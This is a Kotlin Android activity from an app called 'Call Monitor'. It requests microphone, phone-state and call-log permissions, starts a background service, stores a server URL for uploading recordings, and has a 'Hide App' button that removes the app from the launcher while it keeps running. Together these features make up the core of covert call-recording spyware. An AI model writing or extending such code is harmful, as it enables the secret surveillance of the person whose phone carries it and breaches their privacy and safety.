package com.callmonitor

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.preference.PreferenceManager
import com.callmonitor.databinding.ActivityMainBinding
import com.callmonitor.service.BackgroundService

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { PreferenceManager.getDefaultSharedPreferences(this) }

    companion object {
        private const val PREF_SERVER_URL = "server_url"
        private const val DEFAULT_SERVER_URL = "http://192.168.0.104:8000"
    }

    private val requiredPermissions = mutableListOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (allGranted) {
            updatePermissionStatus()
            startBackgroundServiceSafely()
            Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        updatePermissionStatus()
    }

    private fun startBackgroundServiceSafely() {
        try {
            val serviceIntent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "Service error: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun setupUI() {
        // Load saved server URL
        val savedUrl = prefs.getString(PREF_SERVER_URL, DEFAULT_SERVER_URL)
        binding.editServerUrl.setText(savedUrl)

        // Save server URL button
        binding.btnSaveServer.setOnClickListener {
            val url = binding.editServerUrl.text.toString().trim()
            if (url.isNotEmpty()) {
                prefs.edit().putString(PREF_SERVER_URL, url).apply()
                Toast.makeText(this, "Server URL saved", Toast.LENGTH_SHORT).show()
            }
        }

        // Manual sync button - also starts service
        binding.btnSyncNow.setOnClickListener {
            startBackgroundServiceSafely()
        }

        // Request permissions button
        binding.btnRequestPermissions.setOnClickListener {
            requestAllPermissions()
        }

        // Hide app button
        binding.btnHideApp.setOnClickListener {
            showHideAppConfirmation()
        }
        
        // Set default text
        binding.txtTotalRecordings.text = "Total Recordings: 0"
        binding.txtPendingUploads.text = "Pending Uploads: 0"
    }

    private fun updatePermissionStatus() {
        val allGranted = requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            binding.txtPermissionStatus.text = "✅ All permissions granted"
            binding.txtPermissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
        } else {
            binding.txtPermissionStatus.text = "⚠️ Permissions needed"
            binding.txtPermissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_orange_dark))
        }
    }

    private fun requestAllPermissions() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest)
        } else {
            Toast.makeText(this, "All permissions already granted", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showHideAppConfirmation() {
        AlertDialog.Builder(this)
            .setTitle("Hide App?")
            .setMessage(
                "This will hide the app from the launcher.\n\n" +
                "The app will continue running in background.\n\n" +
                "To access again: Settings → Apps → Call Monitor\n\n" +
                "Are you sure?"
            )
            .setPositiveButton("Yes, Hide") { _, _ ->
                hideApp()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun hideApp() {
        try {
            val componentName = ComponentName(this, "com.callmonitor.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Toast.makeText(this, "App hidden from launcher", Toast.LENGTH_LONG).show()
            finish()
        } catch (e: Exception) {
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}
